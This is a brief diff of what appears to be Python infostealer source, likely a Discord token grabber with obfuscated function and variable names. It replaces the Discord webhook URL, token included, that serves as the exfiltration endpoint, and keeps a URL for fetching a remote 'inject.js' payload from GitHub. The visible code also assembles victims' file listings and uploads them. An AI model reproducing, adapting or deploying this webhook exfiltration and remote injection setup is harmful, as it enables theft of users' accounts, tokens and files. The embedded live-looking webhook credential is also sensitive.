@@ -538,7 +538,7 @@ def mac_check():
             pass
 
 
-hook = "https://discord.com/api/webhooks/1278963514249056316/0J9q6TT8s8PM9RiVzd7Ve9VzL49rs5UxaPHRtCJi9EIdx9Em0h2kFM_MSZt-oxvGqmWU"
+hook = "https://discord.com/api/webhooks/1439354104068571248/SiDSBzeY9fLRZRVvZNCDjTMPn8L_xRD_4VelMFJlJ3dlWqybpyJTr2kpD0gfDukL902v"
 inj3c710n_url = "https://raw.githubusercontent.com/blxsi/asdasdas/main/inject.js"
 color =  0x812118
 DETECTED = False
@@ -1654,3 +1654,4 @@ if not DETECTED:
                 filetext += f"└─<:open_file_folder: [{fileanme}]({b})\n"
             filetext += "\n"
     UP104D("kiwi", filetext)
+
